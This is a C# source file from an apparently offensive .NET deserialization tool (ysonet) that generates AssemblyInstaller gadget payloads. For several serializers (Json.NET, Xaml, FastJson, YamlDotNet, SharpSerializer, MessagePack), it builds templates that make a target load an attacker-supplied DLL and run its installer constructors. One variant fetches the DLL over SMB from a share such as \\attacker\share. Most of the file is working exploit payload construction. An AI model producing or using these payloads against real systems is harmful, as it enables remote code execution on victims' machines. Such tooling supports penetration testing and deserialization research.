using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Configuration.Install.AssemblyInstaller turns one string into a loaded
    /// assembly and then into running code, in two steps that a deserializer can drive:
    ///
    ///   1. the Path SETTER calls Assembly.LoadFrom(value), so the target loads whatever
    ///      DLL the operator names (a local path, or a UNC path fetched over SMB); and
    ///   2. the HelpText GETTER, when Path is not empty, calls InitializeFromAssembly(),
    ///      which looks for every public, non-abstract System.Configuration.Install.Installer
    ///      subclass in that DLL that carries [RunInstaller(true)] and builds each one with
    ///      Activator.CreateInstance.
    ///
    /// So the operator's DLL runs its own installer CONSTRUCTOR on the target. This gadget
    /// carries no code of its own and ysonet never produces the DLL: it is bring your own
    /// DLL. Against a DLL with no such installer class the payload is only an assembly load.
    ///
    /// The getter is reached with the WinForms getter-call carriers: PropertyGrid reads
    /// every property of the objects handed to it, and ComboBox / ListBox / CheckedListBox
    /// read the property named by DisplayMember. AssemblyInstaller's private "initialized"
    /// flag is set at the end of the first successful InitializeFromAssembly, so a carrier
    /// that reads HelpText several times still builds the installers only once.
    ///
    /// Everything this gadget emits lives in this file: the target type names, the property
    /// names, every formatter template, and the two surrogates.
    /// </summary>
    public class AssemblyInstallerLoadGenerator : GenericGenerator
    {
        // Variant 1 delivers a target-local DLL path, variant 2 a UNC path. Both build the
        // same shape; the difference is what the target does to reach the file, which is why
        // variant 2 declares the extra network kind below.
        //
        // Versions stay unspecified on purpose. The gate is not a CLR build: the chain is
        // present on every 4.x runtime, and whether a REMOTE load succeeds is decided by the
        // target's security zone for the share plus loadFromRemoteSources, not by a version
        // range. Stating a range would read as "these builds are vulnerable", which is wrong
        // in both directions, so the real condition is stated in the --variant option help
        // (which --fullhelp and the interactive editor both show) and in
        // docs/usage-and-examples.md, rather than in AdditionalInfo(), which has to stay
        // short enough for the interactive info panel.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
        }

        // The installer-gadget class (an assembly load reached through a serialized object,
        // then the installer types instantiated from it) is Munoz and Mirosh's; the four
        // WinForms getter-call carriers that drive the HelpText getter are Bazydlo's. This
        // gadget is the two put together, so both are credited.
        public override string Finders()
        {
            return "Alvaro Munoz, Oleksandr Mirosh, Piotr Bazydlo";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Kept SHORT on purpose: this is the first block of the interactive info panel, and a
        // long one pushes Formatters, Command input and the category summary off the visible
        // rows (locked by AssemblyInstallerLoadInfoPanelStillShowsItsFacts). The UNC zone
        // rules and the getter-carrier table live in the option help and the public docs.
        public override string AdditionalInfo()
        {
            return "The target loads a DLL you name and runs its [RunInstaller(true)] installer constructors.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.GetterChain, GadgetTags.Independent };
        }

        // The "(N)" suffix is a display-only annotation meaning "this formatter carries N
        // variants". Every formatter here builds both variants, because the two variants
        // differ only in the path the operator supplies.
        //
        // Why the list stops where it does. Every entry below sets ONE property by name on
        // a WinForms carrier, so a serializer is on this list only if it can do that:
        //  - Json.NET and Xaml drive all four carriers, because both can add to the
        //    read-only Items collection of ComboBox / ListBox / CheckedListBox;
        //  - FastJson, JavaScriptSerializer, YamlDotNet, both SharpSerializer flavours and
        //    both MessagePack Typeless flavours need a settable property, so only
        //    PropertyGrid.SelectedObjects works for them (measured: the other three carriers
        //    either deserialize with an EMPTY Items collection, so nothing is ever read, or
        //    throw);
        //  - BinaryFormatter, SoapFormatter, LosFormatter, NetDataContractSerializer,
        //    DataContractSerializer, DataContractJsonSerializer, XmlSerializer and FsPickler
        //    restore FIELDS instead of calling setters, and none of the WinForms carriers is
        //    [Serializable] or has a usable data contract, so none of them can carry this.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                "Json.NET (2)",
                "Xaml (2)",
                "FastJson (2)",
                "JavaScriptSerializer (2)",
                "YamlDotNet < 5.0.0 (2)",
                "SharpSerializerBinary (2)",
                "SharpSerializerXml (2)",
                "MessagePackTypeless (2)",
                "MessagePackTypelessLz4 (2)",
            };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.DllPath;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "Target-local DLL path (default)"),

                // A UNC path makes the target fetch the DLL over SMB before loading it, so
                // this variant adds the network kind. WithFacets replaces the WHOLE set, so
                // the requirements are repeated here; Inputs stays null so it derives from
                // this variant's own CommandInputType.UncPath.
                new GadgetVariant(2, "UNC DLL path (the target fetches it over SMB)",
                        CommandInputType.UncPath)
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.CodeExecution, PayloadKind.Network)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)),
            };
        }

        private int variant_number = 1;   // 1 = local path, 2 = UNC path
        private int getter_number = 1;    // 1 = PropertyGrid, 2 = ComboBox, 3 = ListBox, 4 = CheckedListBox

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "Variant number. It selects what -c must be and what the target has to do to reach the assembly "
                    + "(a .dll or a managed .exe; the sink is Assembly.LoadFrom). Choices: "
                    + "\r\n1 (default) - a path the TARGET can already open, e.g. C:\\programdata\\installer.dll"
                    + "\r\n2 - a UNC path the target fetches over SMB, e.g. \\\\attacker\\share\\installer.dll. "
                    + "The target must be able to reach the share, and .NET only loads an assembly from a share it "
                    + "classifies as Local Intranet; an Internet-zone share (a bare IP is one) needs "
                    + "loadFromRemoteSources=true on the target.",
                    v => int.TryParse(v, out variant_number)
                },
                {
                    "getter=",
                    "Which WinForms getter-call carrier reads AssemblyInstaller.HelpText. Choices: "
                    + "\r\n1 (default) - PropertyGrid (reads every property once; the only carrier the non-Json.NET/Xaml formatters can build)"
                    + "\r\n2 - ComboBox (reads HelpText several times; the installers are still built once)"
                    + "\r\n3 - ListBox"
                    + "\r\n4 - CheckedListBox"
                    + "\r\nOnly Json.NET and Xaml can build carriers 2 to 4.",
                    v => int.TryParse(v, out getter_number)
                },
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // -t deserializes the payload in THIS process, which loads the operator's DLL
            // and runs its installer constructors on the operator's own machine. That is a
            // SELF-EXPLOIT, which is exactly what -t is for in ysonet (the same way -t on
            // ObjectDataProvider runs the -c command here): you supplied the DLL, so running
            // it on yourself is a demonstration, not damage. The option help says so, and
            // FinishHandWrittenPayload below performs the deserialize when -t is set.
            string dllPath = ValidateDllPath(inputArgs);
            RequireSupportedGetter(formatter);

            object payload = FinishHandWrittenPayload(BuildPayload(dllPath, formatter), formatter, inputArgs);
            RefuseIfPathDidNotSurvive(payload, dllPath, formatter, inputArgs);
            return payload;
        }

        // ---- Target type names -------------------------------------------------

        // The two spellings of each name: the assembly qualified form with spaces that the
        // JSON family, Xaml and the two type swaps use, and the space-free form the hand
        // written YamlDotNet and SharpSerializer XML documents use.
        private const string AssemblyInstallerName =
            "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        private const string AssemblyInstallerShortName =
            "System.Configuration.Install.AssemblyInstaller,System.Configuration.Install,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a";

        private const string WinFormsAssembly =
            "System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        private const string WinFormsAssemblyShort =
            "System.Windows.Forms,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        private const string ObjectArrayName =
            "System.Object[],mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        private const string StringName =
            "System.String,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        // The carrier class name for the selected --getter. PropertyGrid is the default and
        // the only one every formatter can build.
        private string GetterCarrier()
        {
            switch (getter_number)
            {
                case 2: return "ComboBox";
                case 3: return "ListBox";
                case 4: return "CheckedListBox";
                default: return "PropertyGrid";
            }
        }

        private bool UsesPropertyGrid()
        {
            return GetterCarrier() == "PropertyGrid";
        }

        // ---- Payload templates -------------------------------------------------

        private object BuildPayload(string dllPath, string formatter)
        {
            if (IsFormatter(formatter, Formatters.JsonNet))
                return JsonNetPayload(dllPath);

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
                return JavaScriptSerializerPayload(dllPath);

            if (IsFormatter(formatter, Formatters.FastJson))
                return FastJsonPayload(dllPath);

            if (IsFormatter(formatter, Formatters.YamlDotNet))
                return YamlDotNetPayload(dllPath);

            if (IsFormatter(formatter, Formatters.Xaml))
                return XamlPayload(dllPath);

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
                return SharpSerializerXmlPayload(dllPath);

            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
                return SharpSerializerBinaryPayload(dllPath);

            if (IsMessagePackTypeless(formatter))
                return MessagePackTypelessPayload(dllPath, IsMessagePackLz4(formatter));

            throw UnsupportedFormatter(formatter);
        }

        // Json.NET reads $type and then sets each named member. It is one of the two
        // formatters that can reach the ComboBox / ListBox / CheckedListBox carriers,
        // because it ADDS to their read-only Items collection instead of assigning it.
        private string JsonNetPayload(string dllPath)
        {
            string installer = @"{
            ""$type"":""" + AssemblyInstallerName + @""",
            ""Path"":""" + EscapeForJsonDoubleQuoted(dllPath, false) + @"""
        }";

            if (UsesPropertyGrid())
            {
                return @"
{
    ""$type"":""System.Windows.Forms.PropertyGrid, " + WinFormsAssembly + @""",
    ""SelectedObjects"":[
        " + installer + @"
    ]
}";
            }

            // DisplayMember is what makes the list control read HelpText on every item, and
            // assigning Text is what makes it look an item up, so both must be present and
            // DisplayMember must be written BEFORE Text.
            return @"
{
    ""$type"":""System.Windows.Forms." + GetterCarrier() + @", " + WinFormsAssembly + @""",
    ""Items"":[
        " + installer + @"
    ],
    ""DisplayMember"":""HelpText"",
    ""Text"":""watever""
}";
        }

        // JavaScriptSerializer resolves __type through a SimpleTypeResolver and then sets
        // public settable properties, so only PropertyGrid.SelectedObjects works here.
        private string JavaScriptSerializerPayload(string dllPath)
        {
            return @"
{
    ""__type"":""System.Windows.Forms.PropertyGrid, " + WinFormsAssembly + @""",
    ""SelectedObjects"":[
        {
            ""__type"":""" + AssemblyInstallerName + @""",
            ""Path"":""" + EscapeForJsonDoubleQuoted(dllPath, false) + @"""
        }
    ]
}";
        }

        // FastJson keeps its type names in a $types table and refers to them by index.
        private string FastJsonPayload(string dllPath)
        {
            return @"
{
    ""$types"":{
        ""System.Windows.Forms.PropertyGrid, " + WinFormsAssembly + @""":""1"",
        """ + AssemblyInstallerName + @""":""2""
    },
    ""$type"":""1"",
    ""SelectedObjects"":[
        {
            ""$type"":""2"",
            ""Path"":""" + EscapeForJsonDoubleQuoted(dllPath, false) + @"""
        }
    ]
}";
        }

        // YamlDotNet < 5.0.0 resolves a "!<!AssemblyQualifiedName>" tag to a real type and
        // then assigns the mapped properties. The path is a double quoted scalar, so the
        // JSON escaping rules apply to it.
        private string YamlDotNetPayload(string dllPath)
        {
            return @"
!<!System.Windows.Forms.PropertyGrid," + WinFormsAssemblyShort + @"> {
    SelectedObjects: [
        !<!" + AssemblyInstallerShortName + @"> {
            Path: """ + EscapeForJsonDoubleQuoted(dllPath, false) + @"""
        }
    ]
}";
        }

        // XamlReader builds the carrier and then assigns its properties, and it can also add
        // to a read-only collection property, which is why all four carriers work here.
        private string XamlPayload(string dllPath)
        {
            string path = EscapeForXmlAttribute(dllPath, false);

            if (UsesPropertyGrid())
            {
                return @"<PropertyGrid xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:ci=""clr-namespace:System.Configuration.Install;assembly=System.Configuration.Install""><PropertyGrid.SelectedObject><ci:AssemblyInstaller Path=""" + path + @""" /></PropertyGrid.SelectedObject></PropertyGrid>";
            }

            string carrier = GetterCarrier();
            return "<" + carrier + @" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:ci=""clr-namespace:System.Configuration.Install;assembly=System.Configuration.Install""><"
                + carrier + ".Items><ci:AssemblyInstaller Path=\"" + path + "\" /></" + carrier + ".Items><"
                + carrier + ".DisplayMember>HelpText</" + carrier + ".DisplayMember><"
                + carrier + ".Text>watever</" + carrier + ".Text></" + carrier + ">";
        }

        // SharpSerializer's XML document names the type in an attribute, so it can be hand
        // written. An object[] property is a "SingleArray" element holding one "Items" list.
        private string SharpSerializerXmlPayload(string dllPath)
        {
            return @"
<Complex type=""System.Windows.Forms.PropertyGrid," + WinFormsAssemblyShort + @""">
    <Properties>
        <SingleArray name=""SelectedObjects"" type=""" + ObjectArrayName + @""">
            <Items>
                <Complex type=""" + AssemblyInstallerShortName + @""">
                    <Properties>
                        <Simple name=""Path"" type=""" + StringName + @""" value=""" + EscapeForXmlAttribute(dllPath, false) + @"""/>
                    </Properties>
                </Complex>
            </Items>
        </SingleArray>
    </Properties>
</Complex>";
        }

        // No document to hand write on the binary side, and building the real graph would
        // load the DLL inside ysonet, so serialize the surrogates below and rewrite the two
        // type names in the stream.
        private byte[] SharpSerializerBinaryPayload(string dllPath)
        {
            return SharpSerializerTypeSwap.SerializeAs(
                BuildSurrogateGraph(dllPath),
                TargetTypeNames());
        }

        // MessagePack Typeless writes a type name wherever the member's static type is
        // object, which here is the root and the SelectedObjects elements - exactly the two
        // names that have to become the framework ones.
        private byte[] MessagePackTypelessPayload(string dllPath, bool useLz4)
        {
            return MessagePackTypelessTypeSwap.SerializeAs(
                BuildSurrogateGraph(dllPath),
                TargetTypeNames(),
                useLz4);
        }

        private static PropertyGridSurrogate BuildSurrogateGraph(string dllPath)
        {
            return new PropertyGridSurrogate
            {
                SelectedObjects = new object[]
                {
                    new AssemblyInstallerSurrogate { Path = dllPath }
                }
            };
        }

        private static Dictionary<Type, string> TargetTypeNames()
        {
            return new Dictionary<Type, string>
            {
                { typeof(PropertyGridSurrogate), "System.Windows.Forms.PropertyGrid, " + WinFormsAssembly },
                { typeof(AssemblyInstallerSurrogate), AssemblyInstallerName },
            };
        }

        // Shape only, never deserialized as itself: the two type swaps rewrite these names
        // to the framework types before the payload leaves ysonet. The property names are
        // what the target reads, so they must match the real types exactly.
        internal sealed class PropertyGridSurrogate
        {
            public object[] SelectedObjects { get; set; }
        }

        internal sealed class AssemblyInstallerSurrogate
        {
            public string Path { get; set; }
        }

        // ---- Input rules -------------------------------------------------------

        /// <summary>
        /// The -c value, checked against the selected variant. The path is never opened
        /// here: it belongs to the TARGET's file system, and reading it would be the one
        /// thing this gadget must not do on the operator's machine.
        /// </summary>
        internal string ValidateDllPath(InputArgs inputArgs)
        {
            string path = inputArgs == null ? null : inputArgs.Cmd;
            if (string.IsNullOrWhiteSpace(path))
                throw new ArgumentException(Name()
                    + " requires the path of an installer DLL in -c, for example -c \"C:\\programdata\\installer.dll\""
                    + " (variant 1) or -c \"\\\\attacker\\share\\installer.dll\" (variant 2).");

            path = path.Trim();

            foreach (char c in path)
            {
                // Windows allows none of these in a path, and each of them would also have
                // to survive a JSON string, an XML attribute and a YAML scalar. Rejecting is
                // clearer than emitting a payload that silently names a different file.
                if (char.IsControl(c) || c == '"' || c == '<' || c == '>' || c == '|' || c == '*' || c == '?')
                    throw new ArgumentException(
                        "The DLL path must not contain control characters or any of \" < > | * ?");
            }

            // The sink is Assembly.LoadFrom, which takes any managed PE, so an .exe is as
            // valid a payload as a .dll. What it cannot take is a shell command or a source
            // file, and that is the mistake worth catching, so the two cheap rules are: a
            // loadable extension, and something that is actually a path rather than a bare
            // program name ("calc.exe" passes the first rule and fails the second).
            if (!path.EndsWith(".dll", StringComparison.OrdinalIgnoreCase)
                && !path.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                throw new ArgumentException(Name()
                    + " expects a managed assembly, so the path must end in \".dll\" or \".exe\":"
                    + " the target calls Assembly.LoadFrom on it.");

            if (path.IndexOf('\\') < 0 && path.IndexOf('/') < 0)
                throw new ArgumentException(Name()
                    + " expects a path, not a bare file name: \"" + path + "\" would be resolved"
                    + " against whatever directory the target process happens to be in."
                    + " Use something like C:\\programdata\\installer.dll.");

            bool isUnc = path.StartsWith(@"\\", StringComparison.Ordinal);

            if (variant_number == 2 && !isUnc)
                throw new ArgumentException(
                    "Variant 2 delivers the DLL over SMB, so -c must be a UNC path such as"
                    + " \\\\attacker\\share\\installer.dll. Use variant 1 for a path the target already has.");

            if (variant_number != 2 && isUnc)
                throw new ArgumentException(
                    "Variant 1 is for a path the target can already open, but -c is a UNC path."
                    + " Use --variant 2, which declares the SMB fetch this needs.");

            return path;
        }

        /// <summary>
        /// Only Json.NET and Xaml can build the three list carriers. The others need a
        /// settable property, and ComboBox / ListBox / CheckedListBox expose Items as a
        /// read-only collection, so they deserialize with nothing in it and never read
        /// HelpText. Refuse rather than hand back a payload that quietly does nothing.
        /// </summary>
        private void RequireSupportedGetter(string formatter)
        {
            if (getter_number < 1 || getter_number > 4)
                throw new ArgumentException("--getter must be 1 (PropertyGrid), 2 (ComboBox), 3 (ListBox) or 4 (CheckedListBox).");

            if (UsesPropertyGrid())
                return;

            if (IsFormatter(formatter, Formatters.JsonNet) || IsFormatter(formatter, Formatters.Xaml))
                return;

            throw new ArgumentException("--getter " + getter_number + " (" + GetterCarrier() + ") is only"
                + " available with Json.NET and Xaml. " + formatter + " can only set a property, and the"
                + " Items collection of that carrier has no setter, so it would deserialize empty."
                + " Use --getter 1 (PropertyGrid) with " + formatter + ".");
        }

        /// <summary>
        /// The path is operator DATA the target hands straight to Assembly.LoadFrom, and the
        /// minifiers are not text preserving: the XML one collapses "a; b" into "a;b" inside
        /// an attribute, and the YAML one collapses a run of spaces, so "C:\two  spaces\x.dll"
        /// comes out naming a different file. Both are deliberate - they are what shrinks a
        /// payload - so the minifiers are not the thing to change. Verify instead, and
        /// refuse: shipping a payload that quietly loads the wrong file is the worst outcome.
        ///
        /// Verify, do not predict. A "reject a double space" rule would have missed the
        /// "; " case, and any later minifier change would silently invalidate it.
        /// </summary>
        private void RefuseIfPathDidNotSurvive(object payload, string dllPath, string formatter, InputArgs inputArgs)
        {
            if (PathSurvived(payload, dllPath, formatter))
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this path with " + formatter
                + (minified ? " and --minify" : "") + ": the payload no longer carries \"" + dllPath
                + "\" exactly, so the target would load a different file."
                + (minified
                    ? " Drop --minify, or use a path with no repeated spaces and no \"; \" sequence."
                    : " Use a path with no carriage return and no leading or trailing whitespace in a component."));
        }

        // True when the emitted payload still names the exact path.
        //
        //  - the two XML documents put it in an ATTRIBUTE, so it is compared through an XML
        //    reader (which decodes &amp; and friends back to what the operator typed);
        //  - the three JSON documents and the YAML one put it in a double quoted scalar, so
        //    the escaped rendering is what has to be present verbatim;
        //  - the two binary formats have no minify pass at all (MinifyHandWrittenPayload
        //    returns a byte payload untouched) and carry string records verbatim, so there
        //    is nothing that could rewrite them.
        private bool PathSurvived(object payload, string dllPath, string formatter)
        {
            if (IsFormatter(formatter, Formatters.Xaml) || IsFormatter(formatter, Formatters.SharpSerializerXml))
                return MinifiedTextGuard.MissingTextValues(payload, new[] { dllPath }).Count == 0;

            string text = payload as string;
            if (text == null)
                return true;

            return text.IndexOf(EscapeForJsonDoubleQuoted(dllPath, false), StringComparison.Ordinal) >= 0;
        }
    }
}
